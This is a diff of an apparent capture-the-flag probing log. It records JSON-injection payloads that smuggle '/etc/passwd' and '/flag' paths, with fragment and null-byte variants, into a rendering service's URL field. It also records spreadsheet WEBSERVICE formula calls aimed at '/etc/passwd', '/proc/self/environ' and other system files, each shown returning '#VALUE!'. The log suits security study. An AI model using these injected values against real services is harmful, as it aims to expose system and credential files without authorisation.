@@ -1,28 +1,28 @@
 
-=== control TARGET ''
-STATUS 200 TYPE image/png BYTES 12297 PNG True
-SAVED thumb_control.png
+=== COM.MICROSOFT.WEBSERVICE("/etc/passwd")
+STATUS 200 BYTES 8 RESPONSE #VALUE!
 
-=== abs_passwd TARGET '"},"URL":{"type":"string","value":"/etc/passwd'
-STATUS 200 TYPE image/png BYTES 12297 PNG True
-SAVED thumb_abs_passwd.png
 
-=== abs_flag TARGET '"},"URL":{"type":"string","value":"/flag'
-STATUS 200 TYPE image/png BYTES 12297 PNG True
-SAVED thumb_abs_flag.png
+=== COM.MICROSOFT.WEBSERVICE("/flag")
+STATUS 200 BYTES 8 RESPONSE #VALUE!
 
-=== fragment_passwd TARGET '"},"URL":{"type":"string","value":"/etc/passwd#x.txt'
-STATUS 200 TYPE image/png BYTES 12297 PNG True
-SAVED thumb_fragment_passwd.png
 
-=== fragment_flag TARGET '"},"URL":{"type":"string","value":"/flag#x.txt'
-STATUS 200 TYPE image/png BYTES 12297 PNG True
-SAVED thumb_fragment_flag.png
+=== COM.MICROSOFT.WEBSERVICE("/flag.txt")
+STATUS 200 BYTES 8 RESPONSE #VALUE!
 
-=== nul_passwd TARGET '"},"URL":{"type":"string","value":"/etc/passwd\\u0000.txt'
-STATUS 200 TYPE image/png BYTES 12297 PNG True
-SAVED thumb_nul_passwd.png
 
-=== nul_flag TARGET '"},"URL":{"type":"string","value":"/flag\\u0000.txt'
-STATUS 200 TYPE image/png BYTES 12297 PNG True
-SAVED thumb_nul_flag.png
+=== COM.MICROSOFT.WEBSERVICE("/tmp/flag")
+STATUS 200 BYTES 8 RESPONSE #VALUE!
+
+
+=== COM.MICROSOFT.WEBSERVICE("/proc/self/environ")
+STATUS 200 BYTES 8 RESPONSE #VALUE!
+
+
+=== COM.MICROSOFT.WEBSERVICE("/etc/hostname")
+STATUS 200 BYTES 8 RESPONSE #VALUE!
+
+
+=== COM.MICROSOFT.WEBSERVICE("//etc/passwd")
+STATUS 200 BYTES 8 RESPONSE #VALUE!
+
